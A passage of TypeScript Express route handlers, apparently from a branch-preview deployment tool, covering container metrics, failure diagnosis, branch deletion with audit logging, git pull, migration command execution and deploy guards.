    // 共用 list 端点的 merge 逻辑 — 保证两端 source 判定 100% 一致,Bugbot
    // 第四轮的"reveal 与 list 优先级可能漂移"顾虑由共享 builder 根除。
    const merged = buildBranchEnvMap(projectId, branch.id);
    const entry = merged.get(key);
    if (!entry) {
      res.status(404).json({ error: '该分支生效环境里不存在此 key' });
      return;
    }
    res.json({ key, value: entry.value, source: entry.source });
  });

  // GET /api/branches/:id/metrics — 该分支所有 service 的 docker stats 瞬时值(Phase B)
  //
  // 用户反馈(2026-05-04):「想看 Railway 那种 CPU/内存 实时图」。这个端点返回
  // 每个 service 的 cpu% / mem(used+limit) / net(rx+tx) / blockIO,前端 5s 轮询,
  // 在前端维护 60-point ring buffer 画 5min 滚动 sparkline。
  //
  // 性能:一次 `docker stats --no-stream` 拿一个分支所有 service(典型 1-5 个),
  // ~300-800ms。比 N 次 docker inspect 快得多。--no-stream 让 docker 立即退出
  // 不进 streaming 模式。
  //
  // 注意:docker stats 拿不到已停止的容器,所以只对 services[].status === 'running'
  // 的 service 调。idle/stopped/error 的 service 在响应里 stats:null,UI 显示
  // dash 而不是 0(避免 0% 误导成"在跑但空闲")。
  router.get('/branches/:id/metrics', async (req, res) => {
    const { id } = req.params;
    const branch = stateService.getBranch(id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const m = assertProjectAccess(req as any, branch.projectId || 'default');
    if (m) {
      res.status(m.status).json(m.body);
      return;
    }

    const services = Object.entries(branch.services || {});
    const runningContainers = services
      .filter(([, svc]) => svc.status === 'running')
      .map(([, svc]) => svc.containerName);

    const statsMap = await containerService.getServiceStats(runningContainers);

    const result = services.map(([profileId, svc]) => ({
      profileId,
      containerName: svc.containerName,
      status: svc.status,
      stats: svc.status === 'running'
        ? (statsMap.get(svc.containerName) || null)
        : null,
    }));

    res.json({
      branchId: branch.id,
      ts: Date.now(),                   // 给 UI 算两点之间 delta 用(网络/IO 速率)
      services: result,
      runningCount: runningContainers.length,
      totalCount: services.length,
    });
  });

  // GET /api/branches/:id/failure-diagnosis
  //
  // 用户痛点(2026-05-04 UX 验证):分支失败时 drawer 顶部"最近失败原因"只
  // 显示 "api: 启动失败" 4 个字,用户根本不知道是 CDS 锅 / 代码锅 / 配置锅。
  // 这个端点对每个 status === 'error' 的 service 拉最后 30 行 stderr,做错误
  // 模式归类(端口冲突 / OOM / 依赖缺失 / 进程异常退出 / 健康检查超时)。
  // 前端 drawer 在分支状态 === error 时 lazy-load,内联在失败 banner 下面。
  router.get('/branches/:id/failure-diagnosis', async (req, res) => {
    const { id } = req.params;
    const branch = stateService.getBranch(id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const m = assertProjectAccess(req as any, branch.projectId || 'default');
    if (m) {
      res.status(m.status).json(m.body);
      return;
    }
    // 错误模式归类:reg pattern → category + 中文 hint + 责任归属
    type Category = 'port-conflict' | 'oom' | 'missing-deps' | 'build-failed' | 'crashed' | 'health-timeout' | 'image-pull' | 'unknown';
    type Side = 'code' | 'config' | 'cds' | 'unknown';
    const PATTERNS: Array<{ re: RegExp; category: Category; hint: string; side: Side }> = [
      // 构建/编译失败优先级最高:这是最常见也最容易被误判成"未分类/CDS 侧"的根因。
      // 容器内 dotnet build / tsc 失败 → 进程没起来 → 就绪探测超时(症状),根因其实在编译错误。
      { re: /\berror\s+CS\d{3,5}\b/i, category: 'build-failed', hint: 'C# 编译失败 — 容器内 dotnet build 报错,进程无法启动。修复编译错误后重新部署', side: 'code' },
      { re: /\berror\s+TS\d{3,5}\b/i, category: 'build-failed', hint: 'TypeScript 编译失败 — 修复类型错误后重新部署', side: 'code' },
      { re: /:\s*error\s+MSB\d{3,5}\b|Build FAILED/i, category: 'build-failed', hint: '构建失败(MSBuild/编译) — 检查日志里的首个 error 行后重新部署', side: 'code' },
      { re: /EADDRINUSE|address already in use|port.+(in use|occupied)/i, category: 'port-conflict', hint: '端口被占用 — 可能其他分支占了同一端口,可在容量面板停掉旧分支再重试', side: 'config' },
      { re: /OOMKilled|out of memory|cannot allocate memory/i, category: 'oom', hint: '内存超限 — 调大 service 资源配额或减少并发', side: 'config' },
      { re: /Cannot find module|Module not found|MODULE_NOT_FOUND/i, category: 'missing-deps', hint: '依赖缺失 — 检查 build 阶段 pnpm/npm install 是否成功', side: 'code' },
      { re: /image.+(not found|pull access denied)|manifest unknown|repository does not exist/i, category: 'image-pull', hint: 'Docker 镜像拉取失败 — 检查镜像名 / registry 访问', side: 'cds' },
      { re: /health.*check.*timeout|readiness probe failed|healthz.+(timeout|unreachable)|就绪探测超时|容器进程未监听端口/i, category: 'health-timeout', hint: '就绪探测超时 — 容器起了但端口没响应,多半是应用启动崩溃或编译失败,翻日志看首个 error 行', side: 'code' },
      { re: /exit(\s+code|ed with code)?\s*[:=]?\s*(1[35][7-9]|139)/i, category: 'crashed', hint: '进程被强制终止(可能段错误 / 资源限制)', side: 'code' },
    ];
    const classify = (text: string): { category: Category; hint: string; side: Side } => {
      for (const p of PATTERNS) {
        if (p.re.test(text)) return { category: p.category, hint: p.hint, side: p.side };
      }
      // 兜底:exit code N → 进程异常退出
      const exitMatch = text.match(/exit(\s+code|ed with code)?\s*[:=]?\s*(\d+)/i);
      if (exitMatch) {
        return {
          category: 'crashed',
          hint: `进程异常退出 (exit code ${exitMatch[2]}) — 检查应用日志最后几行`,
          side: 'code',
        };
      }
      return { category: 'unknown', hint: '未识别的错误模式 — 查看完整日志诊断', side: 'unknown' };
    };

    const failedServices: Array<{
      profileId: string;
      containerName: string;
      status: string;
      tailLines: string[];
      errorCategory: Category;
      errorHint: string;
      responsibilitySide: Side;
    }> = [];
    const services = branch.services || {};
    for (const [profileId, svc] of Object.entries(services)) {
      if (svc.status !== 'error') continue;
      let tailLines: string[] = [];
      try {
        const raw = await containerService.getLogs(svc.containerName, 30);
        tailLines = raw.split('\n').filter((l) => l.trim()).slice(-30);
      } catch {
        // 容器名不存在 / docker daemon 拉不到日志 — 静默降级,前端会显示空 array
      }
      const blob = (svc.errorMessage || '') + '\n' + tailLines.join('\n');
      const cls = classify(blob);
      failedServices.push({
        profileId,
        containerName: svc.containerName,
        status: svc.status,
        tailLines,
        errorCategory: cls.category,
        errorHint: cls.hint,
        responsibilitySide: cls.side,
      });
    }

    res.json({
      branchId: branch.id,
      branchStatus: branch.status,
      failedServices,
    });
  });

  router.delete('/branches/:id', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    // Project-key scope check: refuse if this branch belongs to a
    // different project than the one the key was minted for.
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }

    const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || undefined;
    const actor = resolveActorFromRequest(req);
    const trigger = typeof req.headers['x-cds-trigger'] === 'string' ? req.headers['x-cds-trigger'] : undefined;
    const deleteReason = trigger === 'webhook'
      ? 'GitHub webhook 删除远程分支后自动清理 CDS preview'
      : trigger
        ? `CDS 内部触发(${trigger})删除分支`
        : `${actor} 请求删除分支`;
    const branchOperationLease = beginBranchOperation(req, res, entry, {
      kind: 'delete',
      source: 'api.delete-branch',
      reason: deleteReason,
      sse: true,
    });
    if (branchOperationCoordinator && !branchOperationLease) return;
    const deleteStartedAt = nowIso();
    const previousDeleteIntent = {
      status: entry.status,
      lastStoppedAt: entry.lastStoppedAt,
      lastStopSource: entry.lastStopSource,
      lastStopReason: entry.lastStopReason,
    };
    try {
      entry.status = 'stopping';
      entry.lastStoppedAt = deleteStartedAt;
      entry.lastStopSource = trigger === 'webhook' ? 'system' : 'cds';
      entry.lastStopReason = `删除分支流程已开始：${deleteReason}`;
      stateService.save();
    } catch (err) {
      entry.status = previousDeleteIntent.status;
      entry.lastStoppedAt = previousDeleteIntent.lastStoppedAt;
      entry.lastStopSource = previousDeleteIntent.lastStopSource;
      entry.lastStopReason = previousDeleteIntent.lastStopReason;
      completeBranchOperation(branchOperationLease, 'failed', (err as Error).message);
      res.status(500).json({
        ok: false,
        error: `删除分支状态持久化失败: ${(err as Error).message}`,
      });
      return;
    }
    try {
      stateService.appendActivityLog(entry.projectId, {
        type: 'stop',
        branchId: entry.id,
        branchName: entry.branch,
        actor,
        note: entry.lastStopReason,
      });
    } catch { /* activity log is best-effort */ }
    const operationAuditFields = {
      operationKind: 'delete',
      operationTrigger: trigger === 'webhook' ? 'webhook' : 'manual',
      operationActor: actor,
      operationSource: 'api.delete-branch',
      commitSha: entry.githubCommitSha || entry.lastDeployDispatchCommitSha || entry.pinnedCommit || null,
    } as const;

    serverEventLogStore?.record({
      category: 'container',
      severity: 'warn',
      source: 'branch-delete',
      action: 'branch.delete.requested',
      message: `delete requested for ${id}: ${deleteReason}`,
      projectId: entry.projectId,
      branchId: entry.id,
      requestId: requestId || null,
      operationId: branchOperationLease?.operationId || null,
      ...operationAuditFields,
      details: {
        actor,
        trigger: trigger || null,
        remoteAddr: req.ip || req.socket.remoteAddress || null,
        userAgent: req.headers['user-agent'] || null,
        referer: req.headers.referer || null,
      },
    });

    let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';

    const finalizeBranchDelete = async (message: string): Promise<void> => {
      // 分支删除收尾:容器此时已 stop+remove,顺手清掉分支专属网(cds-br-<id>),让「删分支即消失」
      // 覆盖到网络层(分支级临时额外服务的隔离网随分支一起消失)。best-effort:网络仍被占用/不存在
      // 都吞掉(removeBranchNetwork 内部已容错)。分支的 extraProfiles 是 BranchEntry 字段,
      // 下面 removeBranch 一并清除,无需单独处理。
      await containerService.removeBranchNetwork(id).catch(() => { /* best-effort */ });
      stateService.removeLogs(id);
      stateService.removeBranch(id);
      stateService.save();
      const deleteStateFlushTimeoutMs = getDeleteStateFlushTimeoutMs();
      const flushResult = await Promise.race([
        stateService.flush().then(() => 'flushed' as const).catch((err) => {
          serverEventLogStore?.record({
            category: 'container',
            severity: 'error',
            source: 'branch-delete',
            action: 'branch.delete.state-flush-failed',
            message: `state flush failed while deleting ${id}`,
            projectId: entry.projectId,
            branchId: entry.id,
            requestId: requestId || null,
            operationId: branchOperationLease?.operationId || null,
            ...operationAuditFields,
            error: { message: (err as Error).message },
            details: { actor, trigger: trigger || null },
          });
          return 'failed' as const;
        }),
        new Promise<'timeout'>((resolve) => {
          const timer = setTimeout(() => resolve('timeout'), deleteStateFlushTimeoutMs);
          timer.unref?.();
        }),
      ]);
      if (flushResult === 'timeout') {
        serverEventLogStore?.record({
          category: 'container',
          severity: 'warn',
          source: 'branch-delete',
          action: 'branch.delete.state-flush-timeout',
          message: `state flush timed out while deleting ${id}; delete success not reported`,
          projectId: entry.projectId,
          branchId: entry.id,
          requestId: requestId || null,
          operationId: branchOperationLease?.operationId || null,
          ...operationAuditFields,
          details: { actor, trigger: trigger || null, timeoutMs: deleteStateFlushTimeoutMs },
        });
        throw new Error(`分支 "${id}" 已停止容器并移出当前内存状态，但删除状态持久化超时；未返回成功，避免重启后误判为已删除。请稍后刷新确认或重试删除。`);
      }
      if (flushResult === 'failed') {
        throw new Error(`分支 "${id}" 已停止容器并移出当前内存状态，但删除状态持久化失败；未返回成功，避免重启后误判为已删除。请检查 server-events 后重试删除。`);
      }
      branchEvents.emitEvent({
        type: 'branch.removed',
        payload: { branchId: id, projectId: entry.projectId, ts: nowIso() },
      });
      const completedEvent = {
        category: 'container',
        severity: 'warn',
        source: 'branch-delete',
        action: 'branch.delete.completed',
        message,
        projectId: entry.projectId,
        branchId: entry.id,
        requestId: requestId || null,
        operationId: branchOperationLease?.operationId || null,
        ...operationAuditFields,
        details: { actor, trigger: trigger || null },
      } as const;
      if (!serverEventLogStore) return;
      if (!serverEventLogStore.recordImmediate) {
        serverEventLogStore.record(completedEvent);
        return;
      }
      const immediateWrite = serverEventLogStore.recordImmediate(completedEvent)
        .then(() => 'written' as const)
        .catch((err) => {
          console.warn(`[branch-delete] completion audit write failed for ${id}: ${(err as Error).message}`);
          serverEventLogStore.record(completedEvent);
          return 'failed' as const;
        });
      const timeout = new Promise<'timeout'>((resolve) => {
        const timer = setTimeout(() => resolve('timeout'), DELETE_COMPLETION_AUDIT_TIMEOUT_MS);
        timer.unref?.();
      });
      const auditResult = await Promise.race([immediateWrite, timeout]);
      if (auditResult === 'timeout') {
        console.warn(`[branch-delete] completion audit write timed out for ${id}; continuing delete response`);
        serverEventLogStore.record(completedEvent);
        serverEventLogStore.record({
          category: 'container',
          severity: 'warn',
          source: 'branch-delete',
          action: 'branch.delete.audit-timeout',
          message: `delete completion audit write timed out for ${id}`,
          projectId: entry.projectId,
          branchId: entry.id,
          requestId: requestId || null,
          operationId: branchOperationLease?.operationId || null,
          ...operationAuditFields,
          details: { actor, trigger: trigger || null, timeoutMs: DELETE_COMPLETION_AUDIT_TIMEOUT_MS },
        });
      }
    };

    // ── Cluster-aware delete ──
    //
    // If the branch is owned by a remote executor, the master doesn't have
    // the worktree or containers locally — deleting locally would silently
    // succeed on master state while leaving the real worktree + containers
    // orphaned on the executor. Proxy the delete to the owning executor's
    // `/exec/delete` endpoint first, then drop master-side state.
    //
    // When proxying fails because the executor is offline, we still remove
    // the master-side state entry (the branch can't be recovered from here)
    // but emit an error step so the operator knows the remote worktree
    // may need manual cleanup.
    const remoteExecutor =
      entry.executorId && registry
        ? registry.getAll().find(n => n.id === entry.executorId && n.role !== 'embedded')
        : null;

    initSSE(res);
    try {
      assertBranchOperationCurrent(branchOperationLease, 'before-branch-delete');
      if (remoteExecutor) {
        // Proxy to the executor's /exec/delete endpoint.
        sendSSE(res, 'step', {
          step: 'dispatch',
          status: 'running',
          title: `正在请求执行器 ${remoteExecutor.id} 删除分支...`,
        });

        const upstreamUrl = `http://${remoteExecutor.host}:${remoteExecutor.port}/exec/delete`;
        let proxied = false;
        try {
          const upstream = await fetch(upstreamUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              ...(config.executorToken ? { 'X-Executor-Token': config.executorToken } : {}),
            },
            body: JSON.stringify({
              branchId: id,
              requestId: requestId || null,
              operationId: branchOperationLease?.operationId || null,
              actor,
              trigger: trigger || null,
            }),
          });
          if (upstream.ok) {
            proxied = true;
            sendSSE(res, 'step', {
              step: 'dispatch',
              status: 'done',
              title: `执行器已删除分支 ${id}`,
            });
          } else {
            const errText = await upstream.text().catch(() => '');
            sendSSE(res, 'step', {
              step: 'dispatch',
              status: 'warning',
              title: `执行器拒绝删除 (HTTP ${upstream.status})，仍继续清理主节点状态`,
              log: errText.slice(0, 200),
            });
          }
        } catch (err) {
          sendSSE(res, 'step', {
            step: 'dispatch',
            status: 'warning',
            title: `无法连接执行器 ${remoteExecutor.id}，仍继续清理主节点状态`,
            log: (err as Error).message,
          });
        }

        // Drop master-side state unconditionally — if the executor is
        // unreachable, the operator can manually clean up on that node.
        const completeMessage = proxied
            ? `分支 "${id}" 已在执行器 ${remoteExecutor.id} 上删除`
            : `分支 "${id}" 已从主节点移除；执行器上的残留请手动检查`;
        await finalizeBranchDelete(completeMessage);
        sendSSE(res, 'complete', { message: completeMessage });
        return;
      }

      await archiveBranchContainerLogs({
        stateService,
        containerService,
        branch: entry,
        source: 'branch-delete',
        serverEventLogStore,
        message: 'captured before branch delete removes containers',
        requestId: requestId || null,
        operationId: branchOperationLease?.operationId || null,
        actor,
        trigger: trigger || null,
      });

      // Local delete path (unchanged behavior)
      for (const svc of Object.values(entry.services)) {
        sendSSE(res, 'step', { step: 'stop', status: 'running', title: `正在停止 ${svc.containerName}...` });
        try {
          await containerService.remove(svc.containerName, {
            projectId: entry.projectId,
            branchId: entry.id,
            profileId: svc.profileId,
            requestId: requestId || null,
            operationId: branchOperationLease?.operationId || null,
            actor,
            trigger: trigger || null,
            operation: 'branch-delete',
            source: 'api.delete-branch',
            reason: deleteReason,
          });
        } catch { /* ok */ }
        sendSSE(res, 'step', { step: 'stop', status: 'done', title: `已停止 ${svc.containerName}` });
      }

      // Remove worktree
      sendSSE(res, 'step', { step: 'worktree', status: 'running', title: '正在删除工作树...' });
      try {
        const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
        await worktreeService.remove(repoRoot, entry.worktreePath);
      } catch { /* ok */ }
      sendSSE(res, 'step', { step: 'worktree', status: 'done', title: '工作树已删除' });

      // Commit the user-visible deletion before best-effort volume cleanup.
      // A slow/hung Docker volume command or master restart must not leave
      // "containers removed but branch card still present" half-state.
      const completeMessage = `分支 "${id}" 已删除`;
      await finalizeBranchDelete(completeMessage);
      sendSSE(res, 'complete', { message: completeMessage });

      // Volume cleanup is intentionally detached from the DELETE response.
      // The branch state and audit completion are already durable; a slow
      // Docker volume command must not keep the SSE stream open or make the
      // browser see HTTP/2 INTERNAL_ERROR during process restarts.
      void (async () => {
        // SSOT: util/node-modules-volume.ts(Bugbot 3e19da66 — 防 sanitize 漂移)
        // 警告 Bugbot 2c7c4ad2:docker `--filter name=` 是 substring 匹配,**不是** regex,
        // `^` 被当字面量 → 永远 0 命中,cleanup 静默失败,孤儿照样累积。
        // 改为子串过滤(name=prefix)粗筛 + JS startsWith 精确兜底,前缀里的 hyphen
        // 已足够独特,不会误吞其他名字。
        const prefix = nodeModulesVolumePrefix(entry.id);
        const list = await shell.exec(`docker volume ls --format='{{.Name}}' --filter name=${prefix}`, { timeout: 10_000 });
        // 警告 Bugbot 2026-05-06 8469603b:虽然我们生成的 volume 名是定长 hex,但
        // docker volume ls 输出来自 docker daemon,理论上可被外部命令污染。
        // shell.exec 走 child_process.exec(整串 shell 解释),恶意 volume 名
        // 含 metacharacter 时 docker volume rm 就成了命令注入。docker volume
        // 名规范是 `[a-zA-Z0-9][a-zA-Z0-9_.-]+`,严格 regex 守门。
        const isSafeVolumeName = (n: string): boolean => /^[a-zA-Z0-9][a-zA-Z0-9_.-]{1,254}$/.test(n);
        if (list.exitCode === 0) {
          const names = list.stdout.split('\n').map((s) => s.trim()).filter((n) =>
            n.startsWith(prefix) && isSafeVolumeName(n),
          );
          for (const name of names) {
            await shell.exec(`docker volume rm ${name}`, { timeout: 10_000 }).catch(() => { /* tolerate */ });
          }
          if (names.length > 0) {
            serverEventLogStore?.record({
              category: 'container',
              severity: 'info',
              source: 'branch-delete',
              action: 'branch.delete.volume-cleanup.completed',
              message: `cleaned ${names.length} node_modules volume(s) after deleting ${id}`,
              projectId: entry.projectId,
              branchId: entry.id,
              requestId: requestId || null,
              operationId: branchOperationLease?.operationId || null,
              details: { count: names.length, names },
            });
          }
        }
      })().catch((err) => {
        serverEventLogStore?.record({
          category: 'container',
          severity: 'warn',
          source: 'branch-delete',
          action: 'branch.delete.volume-cleanup.failed',
          message: `node_modules volume cleanup failed after deleting ${id}`,
          projectId: entry.projectId,
          branchId: entry.id,
          requestId: requestId || null,
          operationId: branchOperationLease?.operationId || null,
          error: { message: (err as Error)?.message || String(err) },
        });
      });
    } catch (err) {
      branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
      res.end();
    }
  });

  // ── Pull latest code ──

  router.post('/branches/:id/pull', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    try {
      const project = entry.projectId ? stateService.getProject(entry.projectId) : undefined;
      const result = isSyntheticCdsManagedRuntimeBranch(entry, project)
        ? { head: entry.githubCommitSha || 'cds-managed-runtime', skipped: true, reason: 'synthetic-cds-managed-runtime' }
        : await worktreeService.pull(entry.branch, entry.worktreePath);
      // PR_C.3: 计数 + activity log
      stateService.incrementBranchStat(id, 'pullCount');
      stateService.stampBranchTimestamp(id, 'lastPullAt');
      stateService.appendActivityLog(entry.projectId, {
        type: 'pull',
        branchId: id,
        branchName: entry.branch,
        actor: resolveActorForActivity(req),
      });
      stateService.save();
      res.json(result);
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/branches/:id/database-init/run', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }
    const rawCommand = typeof req.body?.command === 'string' ? req.body.command.trim() : '';
    if (!rawCommand) {
      res.status(400).json({ error: 'migration_command_required', message: '迁移命令不能为空。' });
      return;
    }
    if (rawCommand.length > 2000) {
      res.status(400).json({ error: 'migration_command_too_long', message: '迁移命令过长，请控制在 2000 字符以内。' });
      return;
    }

    const profiles = stateService.getEffectiveProfilesForBranch(entry);
    const requestedProfileId = typeof req.body?.profileId === 'string' ? req.body.profileId.trim() : '';
    const baseProfile = (requestedProfileId
      ? profiles.find((profile) => profile.id === requestedProfileId)
      : profiles[0]) || null;
    if (!baseProfile) {
      res.status(400).json({ error: 'profile_not_found', message: requestedProfileId ? `构建配置不存在: ${requestedProfileId}` : '尚未配置构建配置。' });
      return;
    }

    const branchOperationLease = beginBranchOperation(req, res, entry, {
      kind: 'database-init',
      profileId: baseProfile.id,
      source: 'api.database-init-run',
      reason: '手动执行数据库初始化/迁移命令',
      sse: false,
    });
    if (branchOperationCoordinator && !branchOperationLease) return;

    const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || undefined;
    try {
      const profile = resolveEffectiveProfile(baseProfile, entry);
      const result = await containerService.runProfileCommand(
        entry,
        profile,
        rawCommand,
        undefined,
        getMergedEnv(entry.projectId || 'default', entry.id),
        {
          requestId,
          operationId: branchOperationLease?.operationId || undefined,
          actor: resolveActorFromRequest(req),
          trigger: triggerFromRequest(req),
          timeoutMs: profile.buildTimeout ?? 600_000,
        },
      );
      const output = maskSecretsText(combinedOutput(result), { mask: true });
      completeBranchOperation(branchOperationLease, result.exitCode === 0 ? 'completed' : 'failed');
      res.status(result.exitCode === 0 ? 200 : 500).json({
        ok: result.exitCode === 0,
        profileId: profile.id,
        command: rawCommand,
        exitCode: result.exitCode,
        output,
      });
    } catch (err) {
      completeBranchOperation(branchOperationLease, 'failed');
      res.status(500).json({ ok: false, error: (err as Error).message });
    }
  });

  // ── Build & Run (SSE stream) ──

  router.post('/branches/:id/deploy', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    if (!isAllowedCdsBranchName(entry.branch)) {
      res.status(400).json({
        error: 'invalid_branch_name',
        message: `拒绝部署非法分支名: ${entry.branch}`,
      });
      return;
    }
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }

    // P4 Part 18 (G1.5): same clone-ready guard as POST /branches.
    // Deploy uses worktree pull/create which would fail with a
    // cryptic git error if the target project's clone isn't ready.
    // Legacy branches (no projectId or legacy 'default') pass through.
    const deployProject = entry.projectId ? stateService.getProject(entry.projectId) : undefined;
    if (deployProject?.cloneStatus && deployProject.cloneStatus !== 'ready') {
      const statusMsg: Record<string, string> = {
        pending: '项目尚未开始克隆。请先 POST /api/projects/' + deployProject.id + '/clone',
        cloning: '项目正在克隆中，请等待完成后重试。',
        error: '项目上次克隆失败，请先重试克隆：' + (deployProject.cloneError || '未知错误'),
      };
      res.status(409).json({
        error: 'project_not_ready',
        cloneStatus: deployProject.cloneStatus,
        message: statusMsg[deployProject.cloneStatus] || `项目克隆状态异常: ${deployProject.cloneStatus}`,
      });
      return;
    }

    // 2026-06-23：项目暂停 = 部署的统一兜底闸门。webhook 闸门 / reconciler 跳过 /
    // scheduler 跳过都各管一段，但任何路径（含 auto-lifecycle 自调）最终都落到本
    // 端点——在这里拦一道，暂停项目就**绝无可能**再被构建。?force=1 为人工逃生口。
    const forceDeployWhilePaused = req.query?.force === '1' || req.query?.force === 'true';
    if (deployProject?.paused === true && !forceDeployWhilePaused) {
      res.status(423).json({
        error: 'project_paused',
        message: `项目「${deployProject.aliasName || deployProject.name}」已暂停，部署被拦截。请先在项目列表恢复该项目，或附加 ?force=1 强制部署一次。`,
        pausedAt: deployProject.pausedAt || null,
        escapeHatch: { hint: '附加 ?force=1 query 可绕过暂停强制部署一次（不推荐）。' },
      });
      return;
    }

    // P4 Part 17 (G2 fix): scope build profiles by the branch's project
    // so a deploy in project A doesn't pull in B's profiles. Pre-Part 3
    // branches default to 'default' (the legacy migration target).
    const profiles = stateService.getEffectiveProfilesForBranch(entry);
    // 归属远端执行器但无法确认其在线时，凡「新期望清单要拆掉现有服务」一律拒绝（Codex P2「Block offline
    // executor removals」+ Bugbot「Missing executor skips offline guard」）：round-17/27 只在「注册表里查到该
    // executor 且离线」时挡，漏了「executorId 指向远端但注册表查不到（已注销/陈旧归属）或 registry 不可用」——
    // 这些情况下本地/另一执行器 redeploy 会把被删服务从 master state 抹掉，而旧容器仍在那台远端 worker 上跑
    // （ghost）。判定：分支归属本地（executorId 缺省或 master-* embedded）→ 放行（容器在本地，就地拆正确）；
    // 否则（executorId 指向远端）必须在注册表里查到**在线**的非 embedded 节点才放行（dispatch 会让 executor
    // 自己收敛），离线/查不到/registry 不可用一律 503、不动 state，等执行器恢复或重新归属后重试。
    {
      const desiredIds = new Set(profiles.map((p) => p.id));
      const droppedExisting = Object.keys(entry.services).filter((sid) => !desiredIds.has(sid));
      // executorId 以 'master-' 开头 = 内嵌 master（本地）；其余非空值 = 远端归属（与 server.ts 心跳口径一致）。
      const remoteAttributed = !!entry.executorId && !entry.executorId.startsWith('master-');
      if (droppedExisting.length > 0 && remoteAttributed) {
        const onlineRemoteNode = registry
          ? registry.getAll().find((n) => n.id === entry.executorId && n.role !== 'embedded' && n.status === 'online')
          : undefined;
        if (!onlineRemoteNode) {
          res.status(503).json({
            error: 'owning_executor_offline',
            message: `分支归属的执行器「${entry.executorId}」当前不可达（离线/已注销/未注册），无法拆除被移除的服务（${droppedExisting.join(', ')}）的容器。请等待执行器恢复或重新归属后重试。`,
            executorId: entry.executorId,
            droppedServices: droppedExisting,
          });
          return;
        }
      }
    }
    if (profiles.length === 0) {
      // 期望清单为空。两种情形分开处理（Codex P2）：
      //  - 本来就没服务 → 一如既往 400「请先添加构建配置」。
      //  - 还有在跑的服务（典型：分支所有服务都是额外服务，清掉 extraProfiles 后期望清单空）→ 不能直接
      //    400 跑路，那样旧容器 + entry.services 行会残留（清掉最后一个额外服务后容器还在跑）。这里把现存
      //    服务全部当孤儿下掉，再返回。用一个 deploy 租约保证拆除期间不与其它操作打架（fencing-safe，
      //    remove 前后各 assertBranchOperationCurrent，与孤儿清理同款）。
      const existingServices = Object.entries(entry.services);
      if (existingServices.length === 0) {
        res.status(400).json({ error: '尚未配置构建配置，请先添加至少一个构建配置。' });
        return;
      }
      // 远端执行器 owned 的分支：容器在执行器上，master 端 remove 是 no-op。
      //  - 在线 → 放行到下面的远端分发，由 executor /exec/deploy 对空 payload 收敛（与 issue 5 同一清理路径）。
      //  - 离线 → 上面的「拆现有服务」通用离线护栏已 503 拦掉（空清单 = 全部现有服务被拆，属其子集），到不了这里。
      const owningRemoteNode = (entry.executorId && registry)
        ? registry.getAll().find((n) => n.id === entry.executorId && n.role !== 'embedded')
        : undefined;
      const remoteOwned = !!owningRemoteNode; // 在线远端 owned（离线已被上方护栏挡下）
      if (!remoteOwned) {
        const cleanupLease = beginBranchOperation(req, res, entry, {
          kind: 'deploy',
          source: 'api.deploy-branch',
          reason: '期望清单为空，清理残留服务容器',
          // deploy 端点契约是 SSE event-stream；本「就地清空」路径以前回 200 JSON，EventSource 客户端会
          // 因 content-type 不符报错/挂起（Bugbot Medium「Deploy route returns JSON not SSE」）。改为 SSE：
          // 拿不到租约时 beginBranchOperation 直接发 SSE 终止事件；拿到后下面 initSSE 开流、逐步 push、complete 收尾。
          sse: true,
        });
        if (branchOperationCoordinator && !cleanupLease) return; // 被拒时 beginBranchOperation 已发 SSE 终止事件
        initSSE(res);
        const cleanupReqId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || undefined;
        const cActor = resolveActorFromRequest(req);
        const cTrigger = triggerFromRequest(req);
        let cleanupStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
        const cleared: string[] = [];
        try {
          for (const [sid, svc] of existingServices) {
            assertBranchOperationCurrent(cleanupLease, `empty-profiles-cleanup before ${sid}`);
            sendSSE(res, 'step', { step: 'remove-orphan-service', status: 'running', title: `正在下掉残留服务 "${sid}"`, timestamp: new Date().toISOString() });
            try {
              await containerService.remove(svc.containerName, {
                projectId: entry.projectId,
                branchId: entry.id,
                profileId: sid,
                requestId: cleanupReqId || null,
                operationId: cleanupLease?.operationId || null,
                actor: cActor,
                trigger: cTrigger,
                operation: 'deploy-empty-profiles-cleanup',
                source: 'api.deploy-branch',
                reason: '期望清单为空，清理残留服务容器',
              });
            } catch { /* best-effort：仍删条目 */ }
            assertBranchOperationCurrent(cleanupLease, `empty-profiles-cleanup after ${sid}`);
            delete entry.services[sid];
            cleared.push(sid);
            sendSSE(res, 'step', { step: 'remove-orphan-service', status: 'done', title: `服务 "${sid}" 已下掉`, timestamp: new Date().toISOString() });
          }
          entry.status = 'idle';
          entry.errorMessage = undefined;
          stateService.save();
        } catch (err) {
          cleanupStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
          completeBranchOperation(cleanupLease, cleanupStatus);
          sendSSE(res, 'error', cleanupStatus === 'cancelled'
            ? { message: '清理被更高优先级操作取代', operationStatus: 'cancelled' }
            : { message: (err as Error).message });
